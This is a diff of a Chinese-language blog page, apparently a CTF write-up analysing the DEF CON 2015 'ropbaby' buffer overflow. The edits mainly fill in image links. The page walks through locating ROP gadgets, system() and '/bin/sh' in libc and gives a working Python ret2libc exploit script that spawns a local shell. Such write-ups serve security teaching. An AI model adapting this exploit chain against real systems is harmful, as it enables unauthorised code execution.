@@ -94,17 +94,17 @@
 <meta property="og:image" content="http://yoursite.com/images/defcon2015_5.png">
 <meta property="og:image" content="http://yoursite.com/images/defcon2015_6.png">
 <meta property="og:image" content="http://yoursite.com/images/efcon2015_7.png">
-<meta property="og:image" content="http://yoursite.com/images/">
-<meta property="og:image" content="http://yoursite.com/images/">
-<meta property="og:image" content="http://yoursite.com/images/">
-<meta property="og:image" content="http://yoursite.com/images/">
+<meta property="og:image" content="http://yoursite.com/images/defcon2015_8.png">
+<meta property="og:image" content="http://yoursite.com/images/defcon2015_9.png">
+<meta property="og:image" content="http://yoursite.com/images/defcon2015_10.png">
+<meta property="og:image" content="http://yoursite.com/images/defcon2015_11.png">
 <meta property="og:image" content="http://yoursite.com/images/">
 <meta property="og:image" content="http://yoursite.com/images/">
 <meta property="og:image" content="http://yoursite.com/images/">
 <meta property="og:image" content="http://yoursite.com/images/">
 <meta property="og:image" content="http://yoursite.com/images/">
 <meta property="og:image" content="http://yoursite.com/images">
-<meta property="og:updated_time" content="2018-08-06T03:01:50.746Z">
+<meta property="og:updated_time" content="2018-08-06T06:15:44.972Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="defcon 2015 ropbaby detailed Analysis">
 <meta name="twitter:description" content="缓冲区溢出">
@@ -386,10 +386,11 @@
 <h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><p>linux_64与linux_86的区别主要有两点：首先是内存地址的范围由32位变成了64位。但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上。<br>x86-64的GCC调用约定将第一个参数放在寄存器rdi中．<br>控制rip地址 echo -ne ‘3\n32\nAAAAAAAABBBBBB\x00\x00CCCCCCCCDDDDDDDD\n’ | ./ropbaby</p>
 <h3 id="获得rop地址"><a href="#获得rop地址" class="headerlink" title="获得rop地址:"></a>获得rop地址:</h3><p>ldd ropbaby 获得程序都调用哪些so文件,其中是否有存在 pop rdi ; ret指令<br>方式1： python ROPgadget.py –binary /lib/x86_64-linux-gnu/libc-2.27.so –only “pop rdi | ret”<br>方式２：./rp-osx-x64 –unique -f /lib/x86_64-linux-gnu/libc-2.27.so -r 1 | grep “pop rdi” </p>
 <h4 id="找到rop链偏移地址-0x00000000000224df-pop-rdi-ret"><a href="#找到rop链偏移地址-0x00000000000224df-pop-rdi-ret" class="headerlink" title="找到rop链偏移地址 0x00000000000224df : pop rdi ; ret"></a>找到rop链偏移地址 0x00000000000224df : pop rdi ; ret</h4><p>gadget_address 0x7ffff7e53aaf = 功能2 给出system_address 0x00007FFFF7E315D0 + 找到的 pop rdi ; ret 偏移地址 = 0x00000000000224df</p>
-<p>/bin/sh放到rdi中，<br>需要清楚的地址<br>system_address<br>binsh_address<br>pop_rdi_retaddress</p>
+<p>/bin/sh放到rdi中，<br>需要清楚的地址<br>libc_address<br>system_offset<br>binsh_offset</p>
+<p>system_address<br>binsh_address<br>pop_rdi_retaddress</p>
 <p>payload：‘A’*8 + gadget_address + binsh_address + system_address</p>
-<h3 id="寻找so文件中system函数地址与偏移"><a href="#寻找so文件中system函数地址与偏移" class="headerlink" title="寻找so文件中system函数地址与偏移"></a>寻找so文件中system函数地址与偏移</h3><p>方式1：nm -D /lib/x86_64-linux-gnu/libc-2.27.so | grep __libc_system  得出 00000000000435d0<br>方式2：objdump -T /lib/x86_64-linux-gnu/libc-2.27.so | grep system<br><img src="/images/" alt="image"><br>方式3：IDA类工具在导出表中查找</p>
-<h3 id="寻找so文件中-bin-sh的地址与偏移获得"><a href="#寻找so文件中-bin-sh的地址与偏移获得" class="headerlink" title="寻找so文件中/bin/sh的地址与偏移获得"></a>寻找so文件中/bin/sh的地址与偏移获得</h3><p>方式1：gdb find  /b find /b 0x7ffff7dee000,0x7ffff7fa7000,’/‘,’b’,’i’,’n’,’/‘,’s’,’h’<br>得到 0x7ffff7f6d573:    “/bin/sh”<br><img src="/images/" alt="image"><br><img src="/images/" alt="image"><br>方式2：strings -a -tx /lib/x86_64-linux-gnu/libc-2.27.so | grep /bin/sh 得到在so库中的偏移为：17f573 /bin/sh 固定不变 libc基地址+/bin/sh 偏移得到/bin/sh的地址<br><img src="/images/" alt="image"><br>方式3：IDA类工具在导出表中查找</p>
+<h3 id="寻找so文件中system函数地址与偏移"><a href="#寻找so文件中system函数地址与偏移" class="headerlink" title="寻找so文件中system函数地址与偏移"></a>寻找so文件中system函数地址与偏移</h3><p>方式1：nm -D /lib/x86_64-linux-gnu/libc-2.27.so | grep __libc_system  得出 00000000000435d0<br>方式2：objdump -T /lib/x86_64-linux-gnu/libc-2.27.so | grep system<br><img src="/images/defcon2015_8.png" alt="image"><br>方式3：IDA类工具在导出表中查找</p>
+<h3 id="寻找so文件中-bin-sh的地址与偏移获得"><a href="#寻找so文件中-bin-sh的地址与偏移获得" class="headerlink" title="寻找so文件中/bin/sh的地址与偏移获得"></a>寻找so文件中/bin/sh的地址与偏移获得</h3><p>方式1：gdb find  /b find /b 0x7ffff7dee000,0x7ffff7fa7000,’/‘,’b’,’i’,’n’,’/‘,’s’,’h’<br>得到 0x7ffff7f6d573:    “/bin/sh”<br><img src="/images/defcon2015_9.png" alt="image"><br><img src="/images/defcon2015_10.png" alt="image"><br>方式2：strings -a -tx /lib/x86_64-linux-gnu/libc-2.27.so | grep /bin/sh 得到在so库中的偏移为：17f573 /bin/sh 固定不变 libc基地址+/bin/sh 偏移得到/bin/sh的地址<br><img src="/images/defcon2015_11.png" alt="image"><br>方式3：IDA类工具在导出表中查找</p>
 <h3 id="再次验证程序功能1所提供地址"><a href="#再次验证程序功能1所提供地址" class="headerlink" title="再次验证程序功能1所提供地址"></a>再次验证程序功能1所提供地址</h3><p><img src="/images/" alt="image"><br>执行完功能1，Ctrl+c进入调试器 ， 然后输入info proc map找出libc基址，相当于用 cat /proc/pid/maps<br><img src="/images/" alt="image"><br>加载libc的实际地址是 0x7ffff7dee000:”\177ELF\002\001\001\003”<br><img src="/images/" alt="image"><br>在Linux系统上，基地址的前4个字节通常是“\x7fELF”或“\x7f\x45\x4c\x46”验证下是否一致，一致．<br><img src="/images/" alt="image"><br>程序功能1原来程序功能1提供的是个指向实际的 libc 基地址 0x00007ffff7dee000<br><img src="/images/" alt="image"></p>
 <h2 id="本地利用"><a href="#本地利用" class="headerlink" title="本地利用"></a>本地利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line">libc_base_addr = 0x00007ffff7dee000</span><br><span class="line">system_offset = 0x00000000000435d0</span><br><span class="line">binsh_offset = 0x0017f573</span><br><span class="line">pop_rdi_ret_offset = 0x000224df</span><br><span class="line"></span><br><span class="line">system_addr = libc_base_addr + system_offset</span><br><span class="line">binsh_addr = libc_base_addr + binsh_offset</span><br><span class="line">pop_rdi_ret_addr = libc_base_addr + pop_rdi_ret_offset</span><br><span class="line"></span><br><span class="line">print &quot;3&quot;   # Option 3: Load ROP CHAIN</span><br><span class="line">print 32    # Size: 32 bytes</span><br><span class="line">print struct.pack(&quot;LLLL&quot;, 0x00AAAAAAAA, pop_rdi_ret_addr, binsh_addr, system_addr)</span><br><span class="line">py=struct.pack(&quot;LLLL&quot;, 0x00AAAAAAAA, pop_rdi_ret_addr, binsh_addr, system_addr)</span><br><span class="line">print repr(py)</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; ./gadget.py; cat -;&#125; | ./ropbaby</span><br></pre></td></tr></table></figure>
@@ -526,7 +527,7 @@
               
               
               <div class="site-state-item site-state-categories">
-                <a href="/security/index.html">
+                <a href="/categories/index.html">
                   <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
@@ -538,7 +539,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-count">7</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
